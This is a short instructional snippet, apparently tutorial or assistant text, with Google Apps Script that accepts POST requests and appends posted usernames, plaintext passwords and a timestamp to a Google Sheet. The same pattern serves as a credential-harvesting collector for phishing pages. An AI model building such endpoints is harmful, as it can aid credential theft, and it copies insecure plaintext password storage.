'''To store the data into Google Sheets, you need to create a Google Apps Script that handles POST requests and stores data in your Google Sheet.

Google Apps Script Code
Go to your Google Sheet.
Click on Extensions > Apps Script.
Delete the placeholder code and add the following script:'''

function doPost(e) {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  var data = JSON.parse(e.postData.contents);

  // Append a new row to the sheet with the username and password
  sheet.appendRow([data.username, data.password, new Date()]);  // Add a timestamp
  return ContentService.createTextOutput(JSON.stringify({ 'result': 'success' }))
                        .setMimeType(ContentService.MimeType.JSON);
}
